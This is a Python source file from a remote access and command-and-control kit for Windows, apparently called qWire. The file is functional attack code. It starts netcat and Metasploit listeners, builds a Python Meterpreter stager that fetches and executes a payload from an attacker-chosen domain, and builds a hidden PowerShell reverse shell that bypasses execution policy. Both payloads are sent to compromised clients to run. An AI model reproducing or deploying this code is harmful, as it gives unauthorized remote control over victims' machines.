#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.1
# -------------------------------------------------------------
from ..networking.socket import ServerSocket
from ..networking.IP_Handler import IPAddress
from ..client_handling.flags import ClientActionFlags
from ..logging.logging import DNSconfigs

from subprocess import run

class ListenerHandler():
    #Function will open a netcat listener on port passed as parameter
    def open_netcat_listener(self,lport):
        run(f'gnome-terminal -e "nc -lvnp {str(lport)}"',shell=True,capture_output=True)    #Open new terminal with netcat listener on port that is passed as parameter

    #Function will open a meterpreter listener with payload and lport passed as parameter
    def open_meterpreter_listener(self,payload,lport):
        lhost = IPAddress().get_local_ip_from_interface()           #Get the local ip from the chosen interface
        run(f'gnome-terminal -e \'msfconsole -q -x "use multi/handler;set payload {payload};set lhost {lhost};set lport {lport};run"\'',shell=True,capture_output=True) #Open meterpreter listener

class Meterpreter():

    #Function will send python meterpreter shellcode to client and open listener to catch connection
    def exec_python_meterpreter_shell(self,lport,encryption_key,client):
        domain = DNSconfigs().retrieve_domain_for_shell()           #Retrieve the domain chosen for shells
        #Construct shell code
        shell_code = f"""import socket,zlib,base64,struct,time      
for i in range(10):
    try:
        host = socket.gethostbyname(('{domain}'))
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,{lport}))
        break
    except:
        time.sleep(5)
l = struct.unpack('>I', s.recv(4))[0]
d = s.recv(l)
while len(d) < l:
    d += s.recv(l - len(d))
exec(zlib.decompress(base64.b64decode(d)), {{'s': s}})"""
        ListenerHandler().open_meterpreter_listener('python/meterpreter/reverse_tcp',lport)             #Open the listener
        data = str(f'{ClientActionFlags().exec_python_code}{ClientActionFlags().seperator}{shell_code}')#Prepare the data with the shell code
        ServerSocket().send_data_to_client(client,encryption_key,data)                                  #Send the data to the client for execution

class PowerShell:
    #Function will execute a reverse shell using powershell
    def exec_reverse_shell(self,lport,encryption_key,client):
        lhost = DNSconfigs().retrieve_domain_for_shell()
        #Prepare shell code
        shell_code = 'powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = ' \
                     f'New-Object Net.Sockets.TCPClient(\'{lhost}\', {lport});$NetworkStream = ' \
                     '$TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);' \
                     'function WriteToStream ($String) {[byte[]]$script:Buffer = ' \
                     '0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + (pwd).Path + \'> \');' \
                     '$StreamWriter.Flush()}WriteToStream \'\';while(($BytesRead = ' \
                     '$NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8)' \
                     '.GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String}' \
                     ' catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"'
        ListenerHandler().open_netcat_listener(lport)                                                           #Open listener
        data = str(f'{ClientActionFlags().system_command}{ClientActionFlags().seperator}{shell_code}')          #Prepare the data
        ServerSocket().send_data_to_client(client,encryption_key,data)                                          #Send the data to the client for execution
